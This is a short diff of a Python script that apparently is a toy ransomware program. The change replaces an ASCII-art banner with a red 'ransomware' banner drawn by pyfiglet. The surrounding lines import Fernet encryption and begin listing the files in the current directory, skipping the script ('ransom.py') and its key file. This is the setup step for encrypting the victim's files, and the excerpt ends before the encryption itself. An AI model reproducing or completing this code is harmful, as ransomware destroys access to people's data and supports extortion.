@@ -1,20 +1,12 @@
 #!/usr/bin/env python3
 import os
 from cryptography.fernet import Fernet
+from pyfiglet import figlet_format
+from termcolor import colored
 
-print("""
-_______________________________________________________________________________
- _    _                  _                                                     |
-| |  | |                | |  _                       _    ______   ______      |
-| |  | |  _    ______   | | / /   _      _    ______| |  |     |  |  ____|     |
-| |  | | | |  |  ____|  | |/ /   | |    | |  |  __  | |  |     |  | |____      |
-\ \  / / | |  | |       |   <    | | /\ | |  | |  | | |  |    /   |  ____|     |
- \ \/ /  | |  |  ____   | |\ \   \ \/  \/ /  | |__| | |  | |\ \   | |____      |
-  \__/   |_|  |______|  |_| \_\   \/    \/   |______| |  |_| \_\  |______|     |
-                                                    \_|                        |
-   HAVE FUN!!                                                                  |
-_______________________________________________________________________________|                                                   
-\n""")
+
+print(colored(figlet_format("ransomware", font="pagga"), color="red"))
+
 files=[]
 for file in os.listdir():
 	if file=="ransom.py" or file=="thekey.key":
